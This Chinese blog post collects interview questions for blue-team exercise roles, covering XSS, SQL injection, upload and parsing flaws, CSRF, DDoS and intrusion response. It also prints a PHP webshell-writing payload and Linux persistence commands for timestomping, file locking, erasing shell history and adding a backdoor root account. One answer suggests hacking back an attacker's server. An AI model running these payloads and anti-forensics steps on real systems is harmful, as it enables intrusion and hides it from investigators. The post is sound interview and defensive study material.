<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="护网面试题目, null">
    <meta name="description" content="护网面试资料整理">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>护网面试题目 | null</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.1"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span"></span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name"></div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">护网面试题目</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E6%8A%A4%E7%BD%91/">
                                <span class="chip bg-color">护网</span>
                            </a>
                        
                            <a href="/tags/%E8%93%9D%E9%98%9F/">
                                <span class="chip bg-color">蓝队</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%8A%A4%E7%BD%91/" class="post-category">
                                护网
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-04-02
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-04-11
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    24.7k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    106 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="1-xss原理？存储型xss如何利用？"><a href="#1-xss原理？存储型xss如何利用？" class="headerlink" title="1.xss原理？存储型xss如何利用？"></a>1.xss原理？存储型xss如何利用？</h2><p>1.XSS（跨站脚本攻击）又叫CSS (Cross Site Script) ，为了区别层叠样式表（CSS）所以叫XSS。它指的是攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。<br>2.一、窃取用户的cookie，登陆用户账号。 二、进行社工钓鱼，如弹出来假的后台页面或者弹一个下载flash的木马页面。 三、配合CSRF漏洞进行蠕虫攻击。</p>
<h2 id="2-渗透测试流程"><a href="#2-渗透测试流程" class="headerlink" title="2.渗透测试流程"></a>2.渗透测试流程</h2><p>1.明确目标    2.分析风险，获得授权    3.信息收集    4.漏洞探测（手动&amp;自动）    5.漏洞验证    6.信息分析    7.利用漏洞，获取数据    8.信息整理    9.形成报告</p>
<h2 id="3-入侵排查思路"><a href="#3-入侵排查思路" class="headerlink" title="3.入侵排查思路"></a>3.入侵排查思路</h2><p>文件分析<br>a) 文件日期、新增文件、可疑&#x2F;异常文件、最近使用文件、浏览器下载文件    b) Webshell 排查与分析    c) 核心应用关联目录文件分析<br>进程分析<br>a) 当前活动进程 &amp; 远程连接   b) 启动进程&amp;计划任务   c) 进程工具分析   i. Windows:Pchunter    ii. Linux: Chkrootkit&amp;Rkhunter<br>系统信息<br>a) 环境变量    b) 帐号信息    c) History    d) 系统配置文件<br>日志分析<br>a) 操作系统日志    i. Windows: 事件查看器（eventvwr）    ii. Linux: &#x2F;var&#x2F;log&#x2F;    b) 应用日志分析    i. Access.log    ii. Error.log</p>
<h2 id="4-weblogic和redis未授权漏洞分别是利用哪个端口"><a href="#4-weblogic和redis未授权漏洞分别是利用哪个端口" class="headerlink" title="4.weblogic和redis未授权漏洞分别是利用哪个端口"></a>4.weblogic和redis未授权漏洞分别是利用哪个端口</h2><p>weblogic是7001，redis是6379.</p>
<h2 id="5-信息收集都是收集什么"><a href="#5-信息收集都是收集什么" class="headerlink" title="5.信息收集都是收集什么"></a>5.信息收集都是收集什么</h2><p>方式：主动扫描，开放搜索等。<br>开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。<br>基础信息：IP、网段、域名、端口。<br>应用信息：各端口的应用。例如web应用、邮件应用、等等。<br>系统信息：操作系统版本<br>版本信息：所有这些探测到的东西的版本。<br>服务信息：中间件的各类信息，插件信息。<br>人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。以及利用社工库收集管理员的密码信息等。<br>防护信息：试着看能否探测到防护设备。</p>
<h2 id="6-常见漏洞以及自己的见解，防护手段等"><a href="#6-常见漏洞以及自己的见解，防护手段等" class="headerlink" title="6.常见漏洞以及自己的见解，防护手段等"></a>6.常见漏洞以及自己的见解，防护手段等</h2><h3 id="一、-SQL注入-SQL-Inject-OWASP-TOP1-2017-："><a href="#一、-SQL注入-SQL-Inject-OWASP-TOP1-2017-：" class="headerlink" title="一、 SQL注入(SQL Inject)[OWASP TOP1 2017]："></a>一、 SQL注入(SQL Inject)[OWASP TOP1 2017]：</h3><p> 1.原理：<br> SQL注入就是把SQL命令插入到Web表单然后提交到所在页面请求（查询字符串），从而达到欺骗服务器执行恶意的SQL命令。<br> 它是利用现在已有的应用程序，将SQL语句插入到数据库中执行，执行一些并非按照设计者意图的SQL语句。<br> 2.原因：<br>  根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。<br> 3.危害：<br> 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。<br> 网页篡改：通过操作数据库对特定网页进行篡改。<br> 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。<br> 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br> 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br> 破坏硬盘数据，瘫痪全系统。<br> 4.防御：<br> (1)严格的数据类型<br> (2)字符转义<br> (3)使用预编译语句<br> (4)存储过程</p>
<h3 id="二、-XSS-Cross-site-Script-OWASP-TOP7-2017"><a href="#二、-XSS-Cross-site-Script-OWASP-TOP7-2017" class="headerlink" title="二、 XSS(Cross-site Script)[OWASP TOP7 2017]"></a>二、 XSS(Cross-site Script)[OWASP TOP7 2017]</h3><p> 原理：<br> 攻击者往Web页面里插入恶意html标签或者javascript代码。<br> 分别是反射型XSS、持久型XSS和DOM XSS<br> 危害：<br> （1）网络钓鱼，盗取各类用户的账号<br> （2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br> （3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br> （4）强制弹出广告页面，刷流量等<br> （5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等<br> （6）进行基于大量的客户端攻击，如DDOS攻击<br> （7）结合其它漏洞，如CSRF漏洞。<br> 3.防御：<br> （1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。<br> （2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br> （3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br> （4）尽量采用POST 而非GET 提交表单</p>
<h3 id="三、-上传漏洞"><a href="#三、-上传漏洞" class="headerlink" title="三、 上传漏洞"></a>三、 上传漏洞</h3><p> 原理<br> 文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器，服务器未经任何检验或过滤，从而造成文件的执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。<br> 危害<br> 1)上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。<br> 2)上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);<br> 3)上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。<br> 4)上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br> 防御：<br> （1）文件扩展名服务端白名单校验。<br> （2）文件内容服务端校验。<br> （3）上传文件重命名。<br> （4）隐藏上传文件路径。<br> （5）文件上传的目录设置为不可执行<br> （6）单独设置文件服务器的域名<br> 以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p>
<h3 id="四、-文件解析漏洞"><a href="#四、-文件解析漏洞" class="headerlink" title="四、 文件解析漏洞"></a>四、 文件解析漏洞</h3><p> 1.IIS 6.0解析利用方法有两种<br> （1）目录解析：&#x2F;xx.asp&#x2F;xx.jpg<br> （2）文件解析：wooyun.asp;.jpg<br> 第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br> 第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp<br> 还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx<br> 2.Apache解析漏洞后缀名解析漏洞<br> Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。<br> 3.PHP CGI解析漏洞<br> 在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为</p>
 <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?><p>‘);?&gt; </p>
<p>1<br> 的文件，然后访问wooyun.jpg&#x2F;x.php,（x.php不存在）在这个目录下就会生成一句话木马 shell.php。<br> 4.%00截断漏洞<br> 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生</p>
<h3 id="五、-CSRF（Cross-Site-Request-Forgery）"><a href="#五、-CSRF（Cross-Site-Request-Forgery）" class="headerlink" title="五、 CSRF（Cross-Site Request Forgery）"></a>五、 CSRF（Cross-Site Request Forgery）</h3><p> 1.原理：<br> CSRF是一种夹持用户在已经登陆的web应用程序上执行非本意的操作的攻击方式。相比于XSS，CSRF是利用了系统对页面浏览器的信任，XSS则利用了系统对用户的信任。</p>
<p>由上图分析我们可以知道构成CSRF攻击是有条件的：<br> 　　1、客户端必须一个网站并生成cookie凭证存储在浏览器中<br> 2、该cookie没有清除，客户端又tab一个页面进行访问别的网站<br> 2.危害<br> 攻击者利用会话劫持达到自己的目的，比如转账、积分等<br> 3.防御<br> （1） GET、POST的正确使用<br> （2） 利用验证码（在一定的情况下使用，但是为了防止客户产生不好印象，尽量不用）<br> （3） Referer Check(HTTP  Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。但服务器并非任何时候都能取到referer、保护客户隐私，不作为预防主要手段)<br> （4） Anti CSRF Token：<br> 为每一个表单生成一个随机数秘钥，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
<h3 id="六、-DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack"><a href="#六、-DDos攻击-分布式拒绝服务-Distributed-Denial-of-service-Attack" class="headerlink" title="六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)"></a>六、 DDos攻击 分布式拒绝服务(Distributed Denial of service Attack)</h3><p> 1.原理<br> 攻击者想办法让目标服务器的磁盘空间、内存、进程、网络带宽等资源被占满，从而导致正常用户无法访问。<br> 攻击者进行拒绝服务攻击，实际上让服务器实现两种效果：一是迫使服务器的缓冲区满，无法接收新的请求;二是使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接。<br> 攻击者是使用傀儡机(俗称“肉鸡”，受病毒木马操控的计算机或服务器)作为攻击平台，通过大量伪装合法的请求占用大量网络资源，以达到使指定目标的网络或服务瘫痪中断。<br> 2.危害：<br> 服务器瘫痪、用户无法正常访问。<br> 3.类型<br> （1）SYN Flood攻击：这种攻击方法是经典最有效的DDoS方法，主要是通过向受害主机发送大量伪造源 IP 和源端口的 SYN 或 ACK  包，导致主机的缓存资源被耗尽或忙于发送回应包而造成拒绝服务，可通杀各种系统的网络服务。这种攻击由于源头都是伪造的，所以追踪起来比较困难。但是，该攻击实施起来有一定难度，需要大量高带宽的僵尸主机。<br> （2）TCP 全连接攻击：这种攻击是为了绕过常规防火墙的检查而设计的。一般情况下，常规防火墙大多对于正常的 TCP  连接是放过的，但是很多网络服务程序能接受的 TCP 连接数是有限的。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的 TCP  连接，直到服务器的内存等资源被耗尽而被拖跨，  从而造成拒绝服务。种攻击的特点是可绕过一般防火墙的防护而达到攻击;缺点是需要找很多僵尸主机，且僵尸主机的IP 是暴露，易被追踪。<br>  （3）刷 Script 脚本攻击：这种攻击是跟服务器建立正常的TCP连接， 并不断的向脚本程序提交查询、  列表等大量耗费数据库资源的调用。一般来说，  提交一个指令对客户端的耗费和带宽的占用是几乎可以忽略的，而服务器为处理此请求却可能要从上万条记录中去查出某个记录，这种处理过程对资源的耗费是非常大。攻击者只需通过代理向目标服务器大量递交查询指令，只需数分钟就会把服务器资源消耗掉而导致拒绝服务。这种攻击的特点是可以完全绕过普通的防火墙防护， 轻松找一些代理就可实施攻击;缺点是对付只有静态页面的网站效果会大打折扣，并且会暴露攻击者的IP地址。<br> 4.防御：<br> （1）采用高性能的网络设备<br> （2）尽量避免NAT的使用（NAT需要对地址来回转换，转换过程中需要对网络包的校验和进行计算，因此浪费了很多CPU的时间）<br> （3）充足的网络带宽保证<br> （4）升级主机服务器硬件<br> （5）把网站做成静态页面<br> （6）增强操作系统的TCP&#x2F;IP栈<br> （7）安装专业抗DDOS防火墙<br> 附：IP Spoof: 即IP地址欺骗，是一台主机设备冒充另外一台主机的IP地址，与其它设备通信，从而达到某种目的技术。属于IP Spoof类的攻击还有TCP 半连接攻击，也就是SYN Flood攻击</p>
<h2 id="7-发现客户被传了webshell如何处置"><a href="#7-发现客户被传了webshell如何处置" class="headerlink" title="7.发现客户被传了webshell如何处置"></a>7.发现客户被传了webshell如何处置</h2><p>1.先使用webshell查杀工具进行多次查杀。</p>
<p>2.通过webshell文件创建时间点去翻看相关日期的访问日志。</p>
<p>3.通过查看日志进行漏洞分析。</p>
<p>4.修复相关漏洞。</p>
<h2 id="8-获得了攻击者的ip如何进行溯源，获取攻击者的个人信息"><a href="#8-获得了攻击者的ip如何进行溯源，获取攻击者的个人信息" class="headerlink" title="8.获得了攻击者的ip如何进行溯源，获取攻击者的个人信息"></a>8.获得了攻击者的ip如何进行溯源，获取攻击者的个人信息</h2><p>通过IP端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息。</p>
<h2 id="9-有无其他安全产品的使用经验"><a href="#9-有无其他安全产品的使用经验" class="headerlink" title="9.有无其他安全产品的使用经验"></a>9.有无其他安全产品的使用经验</h2><p>根据个人情况回答。 例：使用过中睿、山石网科、360的一些防火墙产品。</p>
<h2 id="10-如果爆发了0day该如何处理"><a href="#10-如果爆发了0day该如何处理" class="headerlink" title="10.如果爆发了0day该如何处理"></a>10.如果爆发了0day该如何处理</h2><p>进行补丁下载</p>
<h2 id="11-Linux下权限维持方法"><a href="#11-Linux下权限维持方法" class="headerlink" title="11.Linux下权限维持方法"></a>11.Linux下权限维持方法</h2><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1561366-20200317155640163-289618331.png"></p>
<h3 id="0x01-修改文件-x2F-终端属性"><a href="#0x01-修改文件-x2F-终端属性" class="headerlink" title="0x01 修改文件&#x2F;终端属性"></a>0x01 修改文件&#x2F;终端属性</h3><h4 id="1-1-文件创建时间"><a href="#1-1-文件创建时间" class="headerlink" title="1.1 文件创建时间"></a>1.1 文件创建时间</h4><p>如果蓝队根据文件修改时间来判断文件是否为后门，如参考index.php的时间再来看shell.php的时间就可以判断shell.php的生成时间有问题。</p>
<p>解决方法：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copytouch -r index.php shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p>
<h4 id="1-2-文件锁定"><a href="#1-2-文件锁定" class="headerlink" title="1.2 文件锁定"></a>1.2 文件锁定</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copychattr +i evil.php  <span class="token comment">#锁定文件</span>
<span class="token function">rm</span> -rf evil.php     <span class="token comment">#提示禁止删除</span>

lsattr  evil.php    <span class="token comment">#属性查看</span>
chattr -i evil.php  <span class="token comment">#解除锁定</span>
<span class="token function">rm</span> -rf evil.php     <span class="token comment">#彻底删除文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="1-3-历史操作命令"><a href="#1-3-历史操作命令" class="headerlink" title="1.3 历史操作命令"></a>1.3 历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
<p>技巧一：只针对你的工作关闭历史记录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">[</span>space<span class="token punctuation">]</span>set +o <span class="token function">history</span>  <span class="token comment">#备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
<p>要重新开启历史功能，执行下面的命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy<span class="token punctuation">[</span>Space<span class="token punctuation">]</span>set -o <span class="token function">history</span>  <span class="token comment">#将环境恢复原状</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>技巧二：从历史记录中删除指定的命令</p>
<p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyhistory <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"keyword"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyhistory -d <span class="token punctuation">[</span>num<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除大规模历史操作记录，这里，我们只保留前150行：</p>
<pre class="line-numbers language-dart" data-language="dart"><code class="language-dart"><span class="token class-name">Copysed</span> <span class="token operator">-</span>i <span class="token string">'150,$d'</span> <span class="token punctuation">.</span>bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="1-4-passwd写入"><a href="#1-4-passwd写入" class="headerlink" title="1.4 passwd写入"></a>1.4 passwd写入</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copy/etc/passwd 各部分含义：
用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的<span class="token environment constant">SHELL</span>
Copy/etc/shadow 各部分含义：
用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>写入举例：</p>
<p>1.增加超级用户</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Copy<span class="token variable">$perl</span> -le <span class="token string">'print crypt("momaek","salt")'</span>
savbSWc4rx8NY

<span class="token variable">$echo</span> <span class="token string">"momaek:savbSWc4rx8NY:hacker:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.如果系统不允许uid&#x3D;0的用户远程登录，可以增加一个普通用户账号</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Copyecho <span class="token string">"momaek:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500"</span> <span class="token operator">>></span> /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

